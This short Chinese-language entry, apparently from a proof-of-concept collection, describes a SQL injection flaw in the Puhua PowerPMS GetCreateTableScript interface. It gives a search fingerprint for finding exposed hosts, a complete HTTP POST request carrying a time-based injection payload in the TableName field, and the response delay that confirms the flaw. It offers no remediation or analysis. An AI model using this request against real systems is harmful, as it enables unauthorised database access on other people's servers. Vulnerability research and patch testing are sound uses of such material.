# 普华PowerPMSGetCreateTableScript接口存在SQL注入漏洞

- **系统**：普华PowerPMSGetCreateTableScript接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Power.login.init"`

**请求体 / payload**
```
**POST** /WebCenter/GetCreateTableScript **HTTP/1.1**
**Host**:
**User-Agent**: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
**Content-Type**: **application/x-www-form-urlencoded**
**TableName**=**1';WAITFOR+DELAY+'0:0:5'--**
:---
```
- **预期**：200　|　响应时间>=5s